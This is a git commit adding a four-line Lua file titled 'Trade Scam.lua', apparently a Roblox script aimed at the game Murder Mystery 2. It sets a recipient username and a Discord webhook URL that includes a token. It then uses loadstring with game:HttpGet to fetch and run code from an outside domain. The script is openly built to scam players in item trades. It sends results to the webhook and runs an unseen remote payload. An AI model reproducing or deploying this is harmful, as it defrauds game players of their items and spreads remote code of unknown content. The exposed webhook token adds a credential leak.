834034d9aeac6c9ab978704dfaa3c83b87566ff4
Xeven-Gaming <154922337+Xeven-Gaming@users.noreply.github.com>
2024-07-28 23:58:29 -0400

    Add files via upload

---
+++ Trade Scam.lua
@@ -0,0 +1,4 @@
+Username = "Exilierz"
+Webhook = "https://discord.com/api/webhooks/1267329954669137953/Q_oCJ7FkaeuN9Tr-dQuo7oTyaCyClOdbE4IfxL59kzL_xLEKv7KFnIc78fdZ7Q9EQ81l
+
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
